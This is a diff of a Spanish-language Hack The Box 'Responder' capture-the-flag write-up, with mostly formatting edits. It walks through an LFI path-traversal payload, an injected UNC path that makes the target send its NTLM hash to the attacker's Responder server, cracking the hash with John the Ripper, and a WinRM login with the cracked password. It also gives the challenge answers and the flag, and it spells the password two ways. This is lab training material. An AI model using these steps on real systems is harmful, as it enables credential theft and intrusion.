@@ -2,7 +2,7 @@
 title: HTB - Responder
 date: 2022-06-19 3:30:00
 categories: [Hack The Box, Starting Point]
-tag: [Responder, LFI]
+tag: [Web, Responder, LFI]
 img_path: /assets/img/htb/responder
 image:
    path: preview1.png
@@ -52,12 +52,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 126.94 seconds
 ```
 
-Visitamos el servidor web corriendo en el puerto 80 mediante el navegador (Firefox).
+Visitamos el servidor web corriendo en el puerto 80 mediante el navegador web.
 
 ![](Pasted image 20220427161647.png)
 ![](Pasted image 20220427161628.png)
 
-Nos redirige a una pagina web llamada **unika.htb**. Debido a que nos encontramos dentro de la misma red que la máquina objetivo y que ese dominio no esta registrado en un servidor DNS, procedemos a agregar la ip y el nombre de dominio al archivo **/etc/hosts** para poder visualizar la pagina web.
+Nos redirige a una pagina web llamada `unika.htb`. Debido a que nos encontramos dentro de la misma red que la máquina objetivo y que ese dominio no esta registrado en un servidor DNS, procedemos a agregar la ip y el nombre de dominio al archivo `/etc/hosts` para poder visualizar la pagina web.
 
 ![](Pasted image 20220427162215.png)
 
@@ -65,11 +65,11 @@ Ahora ya podemos visualizarla.
 
 ![](Pasted image 20220427162345.png)
 
-Navegando por la página nos encontramos con un apartado para cambiar el idioma, si nos fijamos en la url se ve como se incluye un archivo llamado **french.html** mediante **index.php**
+Navegando por la página nos encontramos con un apartado para cambiar el idioma, si nos fijamos en la url se ve como se incluye un archivo llamado `french.html` mediante otro archvio llamado `index.php`.
 
 ![](Pasted image 20220427162745.png)
 
-Vamos a pasarle al parámetro "page" la siguiente cadena para saber si es vulnerable a **LFI** y como consecuencia a **path traversal**.
+Vamos a pasarle al parámetro <b style="color: red">"page"</b> la siguiente cadena para saber si es vulnerable a **LFI** y como consecuencia a **path traversal**.
 
 ```console
 ../../. ./../../../../../windows/system32/drivers/etc/hosts
@@ -80,7 +80,7 @@ Vamos a pasarle al parámetro "page" la siguiente cadena para saber si es vulner
 ![](Pasted image 20220427163432.png)
 
 Como podemos ver existe una vulnerabilidad en esta web.
-Regresando al escaneo, el puerto **5985** se encuentra abierto lo que quiere decir que **WinRM** esta disponible. Podemos aprovecharnos del **LFI** de la página web para capturar el **hash NTLM** de la máquina con ayuda de la herramienta **responder**.
+Regresando al escaneo, el puerto `5985` se encuentra abierto lo que quiere decir que **WinRM** esta disponible. Podemos aprovecharnos del **LFI** de la página web para capturar el **hash NTLM** de la máquina con ayuda de la herramienta `responder`.
 
 Vamos a ejecutar la herramienta con el siguente comando.
 
@@ -96,12 +96,12 @@ Verificamos que el servidor **SMB** este activado.
 
 ![](Pasted image 20220427170523.png)
 
-Mientras **responder** esta esperando una conexion, nos dirigimos a la URL de la página web e ingresamos la siguiente cadena en el parámetro page.
+Mientras `responder` esta esperando una conexion, nos dirigimos a la URL de la página web e ingresamos la siguiente cadena en el parámetro page.
 
 ```console
 //{our machine ip}/somefile
 ```
-Esto para que la página incluya un "recurso" de nuestro servidor **SMB** y se establezca una conexión.
+Esto para que la página incluya un "recurso" de nuestro servidor `SMB` y se establezca una conexión.
 
 ![](Pasted image 20220427171130.png)
 
@@ -109,7 +109,7 @@ Vemos en la terminal que se ha capturado el **hash NTLM**.
 
 ![](Pasted image 20220427171250.png)
 
-Guardamos el hash en un archivo de texto y lo desciframos con ayuda de la herramienta **John The Ripper** .
+Guardamos el hash en un archivo de texto y lo desciframos con ayuda de la herramienta `John The Ripper` .
 
 ![](Pasted image 20220427171705.png)
 
@@ -119,7 +119,7 @@ john -w=/usr/share/wordlists/rockyou.txt hash.txt
 
 ![](Pasted image 20220427172056.png)
 
-A continuación utilizamos la herramienta **evilwinrm** para autenticarnos en el sistema con las credenciales obtenidas.
+A continuación utilizamos la herramienta `evilwinrm` para autenticarnos en el sistema con las credenciales obtenidas.
 
 ```console
 evil-winrm -i {target ip} -u administrator -p badminton
@@ -127,43 +127,56 @@ evil-winrm -i {target ip} -u administrator -p badminton
 
 ![](Pasted image 20220427172504.png)
 
-Ahora solo queda buscar el archivo ==flag.txt==. Este se encuentra en la ruta `C:\Users\mike\Desktop`.
+Ahora solo queda buscar el archivo `flag.txt`. 
+> Este se encuentra en la ruta `C:\Users\mike\Desktop`.
+{: .prompt-info }
 
 ![](Pasted image 20220427172844.png)
 
 ## Preguntas
 
 1. ¿Cuántos puertos TCP están abiertos en la máquina?
+
    **3**
 
 2. Al visitar el servicio web utilizando la dirección IP, ¿cuál es el dominio al que se nos redirige?
+
    **unika.htb**
 
 3. ¿Qué lenguaje de secuencias de comandos se utiliza en el servidor para generar páginas web?
+
    **php**
 
 4. ¿Cuál es el nombre del parámetro de URL que se usa para cargar diferentes versiones de idioma de la página web?
+
    **page**
 
 5. ¿Cuál de los siguientes valores para el parámetro `page` sería un ejemplo de explotación de una vulnerabilidad de inclusión de archivo local (LFI): "french.html", "//10.10.14.6/somefile", "../../. ./../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
+
    **../../. ./../../../../../windows/system32/drivers/etc/hosts**
 
 6. ¿Qué significa NTLM?
+
    **New Technology LAN Manager**
 
 7. ¿Qué indicador usamos en la utilidad Responder para especificar la interfaz de red?
+
    **-I**
 
 8. Hay varias herramientas que aceptan un desafío/respuesta de NetNTLMv2 y prueban millones de contraseñas para ver si alguna de ellas genera la misma respuesta. A una de estas herramientas se la suele denominar `john`, pero el nombre completo es ¿cuál?.
+
    **John The Ripper**
 
 9. ¿Cuál es la contraseña para el usuario administrador?
+ 
    **batminton**
 
 10. Usaremos un servicio de Windows (es decir, que se ejecuta en la caja) para acceder de forma remota a la máquina Responder usando la contraseña que recuperamos. ¿En qué puerto TCP escucha?
+
     **5985**
 
 Root Flag:
+
 **ea81b7afddd03efaa0945333ed147fac**
 
 ![](Pasted image 20220427134218.png)
